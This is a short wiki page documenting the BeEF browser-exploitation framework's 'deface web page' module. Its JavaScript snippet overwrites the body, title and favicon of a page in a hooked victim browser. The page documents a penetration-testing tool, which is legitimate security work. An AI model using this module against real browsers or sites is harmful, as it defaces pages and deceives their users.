##Summary
* **Objective**: Overwrite the page, title and shortcut icon on the hooked page.
* **Date**: ???
* **Authors**: antisnatchor
* **Browsers**: All (User will be notified)
* [[Code|https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/deface_web_page]]

##Internal Working

This command modify the HTML, the title and the favicon of the page with the parameters given :

```javascript
	document.body.innerHTML = "<%= @deface_content %>";
	document.title = "<%= @deface_title %>";
	beef.browser.changeFavicon("<%= @deface_favicon %>");
```

##Feedback